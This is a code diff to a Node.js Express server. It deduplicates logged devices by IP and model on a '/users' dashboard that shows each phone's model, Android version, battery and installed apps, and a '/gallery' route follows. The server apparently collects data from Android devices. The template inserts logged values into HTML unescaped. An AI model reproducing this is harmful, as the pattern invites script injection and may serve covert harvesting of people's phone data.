@@ -126,6 +126,20 @@ app.get('/users', (req, res) => {
     .filter(Boolean)
     .map(x => JSON.parse(x));
 
+  const unique = {};
+
+  logs.forEach(log => {
+
+    if (!log.ip || !log.model) return;
+
+    const key = log.ip + "_" + log.model;
+
+    // latest entry overwrite
+    unique[key] = log;
+  });
+
+  const list = Object.values(unique);
+
   let html = `
   <html>
   <head>
@@ -137,10 +151,10 @@ app.get('/users', (req, res) => {
     </style>
   </head>
   <body>
-    <h2>Total Devices: ${logs.length}</h2>
+    <h2>Total Devices: ${list.length}</h2>
   `;
 
-  logs.reverse().forEach(user => {
+  list.reverse().forEach(user => {
 
     html += `
     <div class="card">
@@ -148,11 +162,10 @@ app.get('/users', (req, res) => {
       <b>Device:</b> ${user.brand} ${user.model}<br>
       <b>Android:</b> ${user.android}<br>
       <b>Battery:</b> ${user.battery}<br>
-      <b>Time:</b> ${user.time}<br>
 
       <h4>Apps (${user.apps?.length || 0})</h4>
       <div class="apps">
-        ${(user.apps || []).map(app => `<div>${app}</div>`).join("")}
+        ${(user.apps || []).map(a => `<div>${a}</div>`).join("")}
       </div>
     </div>
     `;
@@ -162,7 +175,6 @@ app.get('/users', (req, res) => {
 
   res.send(html);
 });
-
 /* ================= GALLERY ================= */
 
 app.get('/gallery', (req, res) => {
